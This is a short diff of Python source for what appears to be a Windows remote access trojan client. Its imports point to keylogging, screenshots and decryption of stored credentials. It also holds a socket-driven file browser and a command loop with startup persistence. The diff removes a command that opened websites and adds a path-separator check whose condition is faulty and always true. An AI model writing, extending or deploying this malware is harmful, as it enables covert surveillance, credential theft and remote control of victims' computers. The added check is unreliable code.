@@ -1,4 +1,4 @@
-import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, pyscreeze, threading, pynput.keyboard, wmi
+import socket, os, sys, platform, time, ctypes, subprocess, sqlite3, pyscreeze, threading, pynput.keyboard, wmi
 import win32api, winerror, win32event, win32crypt
 from shutil import copyfile
 from winreg import *
@@ -182,6 +182,8 @@ def file_browser():
     strDir = decode_utf8(recv(intBuff))
 
     if os.path.isdir(strDir):
+        if strDir[:-1] != "\\" or strDir[:-1] != "/":
+            strDir += "\\"
         arrFiles = os.listdir(strDir)
 
         strFiles = ""
@@ -403,8 +405,6 @@ while True:
                 sys.exit(0)
             elif strData[:3] == "msg":
                 MessageBox(strData[3:])
-            elif strData[:4] == "site":
-                webbrowser.get().open(strData[4:])
             elif strData == "startup":
                 startup(False)
             elif strData == "rmvstartup":
